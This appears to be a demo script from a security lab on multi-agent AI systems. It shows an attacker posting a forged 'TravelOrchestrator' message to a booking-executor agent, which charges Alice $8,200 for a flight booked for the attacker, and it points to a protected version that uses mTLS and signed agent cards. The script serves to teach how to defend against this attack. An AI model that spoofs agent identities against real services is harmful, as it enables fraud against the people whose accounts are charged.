"""Attacker — spoofs TravelOrchestrator identity (ACRF-01 demo)"""
import time

import requests

BOOKING_SERVICE_URL = "http://booking-executor:8000/book"

def spoof_booking():
    print("=" * 70)
    print(" SCENARIO 2: Attacker spoofs the orchestrator identity")
    print("=" * 70)
    print("An attacker has discovered the booking service.")
    print("They craft a message claiming to be TravelOrchestrator.")
    print()

    malicious_message = {
        "sender": "TravelOrchestrator",
        "action": "book_flight",
        "user": "Attacker",
        "route": "SFO->DXB (First Class)",
        "amount": 8200.00,
        "card_owner": "Alice",
        "timestamp": time.time(),
    }
    print("[Attacker] -> BookingExecutor: Book SFO->DXB for 'Attacker', charge Alice ($8200)")
    response = requests.post(BOOKING_SERVICE_URL, json=malicious_message, timeout=10)

    if response.status_code == 200:
        print(f"[BookingExecutor] OK: {response.json()['message']}")
        print()
        print("ATTACK SUCCEEDED")
        print("   Alice was charged $8,200 for a flight she did not book.")
        print("   BookingExecutor had no way to verify sender identity.")
        print()
        return True
    return False

def show_final_damage():
    print("-" * 70)
    print("Final audit of BookingExecutor state:")
    print("-" * 70)
    response = requests.get("http://booking-executor:8000/charges", timeout=10)
    if response.status_code == 200:
        data = response.json()
        print(f"Total bookings processed: {data['total_bookings']}")
        print("Charges by card owner:")
        for owner, amount in data["charges_by_card_owner"].items():
            print(f"  - {owner}: ${amount:.2f}")
        print()

if __name__ == "__main__":
    time.sleep(8)
    spoof_booking()
    time.sleep(2)
    show_final_damage()
    print("=" * 70)
    print(" This is ACRF-01: Implicit Trust Between Agents")
    print("=" * 70)
    print("Run ../protected/ to see how mTLS + signed Agent Cards prevent this attack.")
